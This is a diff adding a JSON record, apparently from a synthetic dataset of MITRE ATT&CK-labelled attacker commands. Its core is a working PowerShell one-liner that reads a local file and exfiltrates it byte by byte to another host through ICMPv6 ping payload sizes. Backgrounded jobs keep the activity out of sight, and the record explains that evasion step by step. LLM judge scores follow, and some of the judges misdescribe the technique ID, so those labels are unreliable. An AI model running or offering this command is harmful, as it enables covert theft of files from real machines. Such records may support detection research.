@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
+  "explanation": "Backgrounds ICMPv6 transmissions that encode bytes in payload size, reducing interactive artifacts while exfiltrating over ICMPv6 consistent with T1011.",
+  "rationale_steps": [
+    "Read file bytes.",
+    "Offset and embed each byte in ICMPv6 payload size.",
+    "Run pings as background jobs to minimize console output and attention."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-131755df",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignment, pipeline operators, and valid cmdlet parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements data exfiltration via ICMPv6 echo requests by encoding file bytes in packet buffer sizes, but it doesn't fully align with T1011 (Exfiltration Over Other Network Medium) as it uses standard IPv6 rather than an alternate network medium.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:36:09.129996Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid PowerShell syntax for variable assignment, .NET calls, piping, loops, cmdlets, and parameters, with no discernible syntax errors.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command technically performs ICMPv6 data encoding for exfiltration, this action is entirely unrelated and inconsistent with MITRE ATT&CK T1011, which focuses on establishing or abusing accounts.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T09:36:21.538905Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced quoting, valid parameters for Test-Connection, correct arithmetic for BufferSize, and proper use of pipelines and separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates bytes over ICMPv6 by encoding values in the payload size and suppresses foreground output via -AsJob and Out-Null, though creating a job per byte is resource-heavy and may fail at scale and the action aligns with exfiltration rather than the provided Establish Accounts description.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T09:37:17.899531Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
